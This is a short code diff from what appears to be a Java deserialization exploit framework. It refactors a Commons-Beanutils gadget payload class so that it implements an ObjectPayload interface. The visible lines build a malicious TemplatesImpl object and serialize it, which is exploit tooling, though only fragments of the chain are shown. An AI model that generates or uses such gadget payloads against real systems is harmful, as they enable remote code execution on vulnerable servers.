@@ -12,9 +12,9 @@ import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
 import java.util.PriorityQueue;
 
-public class CommonsBeanutils1183NOCC {
+public class CommonsBeanutils1183NOCC implements ObjectPayload<Object> {
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         final Object template = Gadgets.createTemplatesImpl(type, param);
 
         ClassPool pool    = ClassPool.getDefault();
@@ -44,5 +44,10 @@ public class CommonsBeanutils1183NOCC {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 }
